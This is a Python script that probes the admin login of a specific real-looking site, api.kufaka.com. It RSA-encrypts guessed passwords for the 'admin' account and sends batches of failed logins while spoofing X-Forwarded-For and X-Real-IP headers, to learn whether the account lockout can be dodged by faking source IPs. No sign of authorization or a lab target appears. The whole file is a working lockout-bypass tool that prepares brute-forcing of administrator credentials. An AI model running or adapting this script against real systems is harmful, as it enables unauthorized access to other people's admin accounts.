import json, base64, random, re, time, urllib.parse, urllib.request, urllib.error

BASE = "https://api.kufaka.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
STATIC_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwM5MT99IIm8ZhbD+yMoU
I23MdvoZ2fWPcewGNHTsobg1qRe3l2lCq9tuDMK+Pm0gnsaLZuly6HnsNWeIVHmL
g0eSy7Oh0EaLW7dC3l4h+8fVQRzqm0EUuh29rKUyPZDyd0Ax2HzbkwmQVCvglGsV
yWOyvS4gAihlH6klsHmIPTQJBjoFBE4Pgzb8/dGRedP2BwekSy2f/0kYIp/pZg8o
elhVhgmNjzzFpnn3jgeau19+y/QeFAmub2liHkuodpFmi4pSrWO6l2Tal/V6l3+L
wvtgYB0lVcMKE1iufhtyGpvDfPU/984hnWOudfJ6W/4rJbAD+vOaXmJ1kOl3cQSt
wQIDAQAB
-----END PUBLIC KEY-----"""


def tlv(b, i):
    tag = b[i]; i += 1
    l = b[i]; i += 1
    if l & 0x80:
        n = l & 0x7f
        l = int.from_bytes(b[i:i + n], "big"); i += n
    return tag, b[i:i + l], i + l


def pem_nums(pem):
    der = base64.b64decode("".join(l.strip() for l in pem.strip().splitlines() if "-----" not in l))
    _, v, _ = tlv(der, 0)
    _, _, i = tlv(v, 0)
    _, bits, _ = tlv(v, i)
    _, seq, _ = tlv(bits[1:], 0)
    _, n, j = tlv(seq, 0)
    _, e, _ = tlv(seq, j)
    return int.from_bytes(n, "big"), int.from_bytes(e, "big")


def rsa_enc(n, e, msg):
    k = (n.bit_length() + 7) // 8
    m = msg.encode()
    ps_len = k - 3 - len(m)
    ps = bytes(random.randint(1, 255) for _ in range(ps_len))
    em = b"\x00\x02" + ps + b"\x00" + m
    return base64.b64encode(pow(int.from_bytes(em, "big"), e, n).to_bytes(k, "big")).decode()


def get_pub():
    try:
        req = urllib.request.Request(BASE + "/admin/auth/getPublicKey")
        req.add_header("User-Agent", UA)
        req.add_header("X-Requested-With", "XMLHttpRequest")
        req.add_header("Referer", "https://api.kufaka.com/admin/")
        r = urllib.request.urlopen(req, timeout=20)
        d = json.loads(r.read().decode("utf-8", "replace"))
        pem = d["data"]["public_key"]
        return pem, "LIVE"
    except Exception as ex:
        print("pubkey live failed: %s" % ex, flush=True)
        return STATIC_PEM, "STATIC"


def post(username, pw, xff=None, xri=None):
    body = urllib.parse.urlencode({"username": username, "password": enc(pw), "totp": "", "enc": "1"})
    req = urllib.request.Request(BASE + "/admin/auth/login", data=body.encode(), method="POST")
    req.add_header("User-Agent", UA)
    req.add_header("X-Requested-With", "XMLHttpRequest")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("Referer", "https://api.kufaka.com/admin/")
    if xff is not None:
        req.add_header("X-Forwarded-For", xff)
    if xri is not None:
        req.add_header("X-Real-IP", xri)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        return r.status, r.read().decode("utf-8", "replace")[:220]
    except urllib.error.HTTPError as ex:
        return ex.code, ex.read().decode("utf-8", "replace")[:220]
    except Exception as ex:
        return 0, "ERR:%s" % type(ex).__name__


def cls(t):
    if "多次登录失败" in t:
        return "LOCK"
    if "用户名或密码错误" in t:
        m = re.search(r"还可以尝试(\d)次", t)
        return "MISS(remain=%s)" % (m.group(1) if m else "?")
    if "解密失败" in t:
        return "DECRYPT_FAIL"
    return "OTHER:" + t[:120]


pem, src = get_pub()
n, e = pem_nums(pem)
enc = lambda w: rsa_enc(n, e, w)
print("PUBKEY src=%s bits=%d e=%d" % (src, n.bit_length(), e), flush=True)


def rnd(a, b, c):
    return "%d.%d.%d.%d" % (a, random.randint(0, 255), random.randint(0, 255), c)

print("\n=== A: fixed XFF (no XRI), same user, 6 attempts ===", flush=True)
A = rnd(198, 51, 100)
for i in range(6):
    st, t = post("admin", "LockProbe_A_%d" % i, xff=A)
    print("A%d xff=%s st=%s -> %s" % (i, A, st, cls(t)), flush=True)

print("\n=== B: rotating fresh XFF (no XRI), 8 attempts ===", flush=True)
for i in range(8):
    x = rnd(198, 51, 100)
    st, t = post("admin", "LockProbe_B_%d" % i, xff=x)
    print("B%d xff=%s st=%s -> %s" % (i, x, st, cls(t)), flush=True)

print("\n=== C: fixed X-Real-IP only (no XFF), 6 attempts ===", flush=True)
C = rnd(198, 51, 100)
for i in range(6):
    st, t = post("admin", "LockProbe_C_%d" % i, xri=C)
    print("C%d xri=%s st=%s -> %s" % (i, C, st, cls(t)), flush=True)

print("\n=== D: fixed XFF + rotating X-Real-IP, 6 attempts ===", flush=True)
D = rnd(198, 51, 100)
for i in range(6):
    xr = rnd(198, 51, 100)
    st, t = post("admin", "LockProbe_D_%d" % i, xff=D, xri=xr)
    print("D%d xff=%s xri=%s st=%s -> %s" % (i, D, xr, st, cls(t)), flush=True)

print("\n=== E: no XFF/XRI after per-XFF locks, 2 attempts (real source IP) ===", flush=True)
for i in range(2):
    st, t = post("admin", "LockProbe_E_%d" % i)
    print("E%d st=%s -> %s" % (i, st, cls(t)), flush=True)

print("\n=== F: brand-new XFF after all above (global-lock check), 3 attempts ===", flush=True)
for i in range(3):
    x = rnd(198, 51, 100)
    st, t = post("admin", "LockProbe_F_%d" % i, xff=x, xri=x)
    print("F%d xff/xri=%s st=%s -> %s" % (i, x, st, cls(t)), flush=True)
print("PROBE_DONE", flush=True)
